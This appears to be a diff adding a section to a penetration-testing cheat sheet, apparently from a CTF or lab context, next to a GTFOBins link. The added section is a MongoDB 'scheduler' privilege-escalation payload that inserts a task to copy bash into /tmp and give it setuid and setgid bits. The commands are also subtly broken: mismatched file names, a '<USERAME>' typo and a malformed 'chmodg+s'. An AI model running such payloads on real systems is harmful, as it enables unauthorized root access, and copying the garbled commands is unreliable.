@@ -312,3 +312,12 @@ searchsploit -m script
 
 ### [exploiting bins]
 https://gtfobins.github.io/gtfobins/vi/
+
+### [privesc mongodb scheduler]
+```
+mongo -p -u <userid> scheduler
+
+db.tasks.insert({"cmd":"/bin/cp /bin/bash /tmp/tom; /bin/chown <USERAME>:admin /tmp/hackedbash; chmodg+s /tmp/hackedbash; chmod u+s /tmp/hackedbash"});
+```
+
+
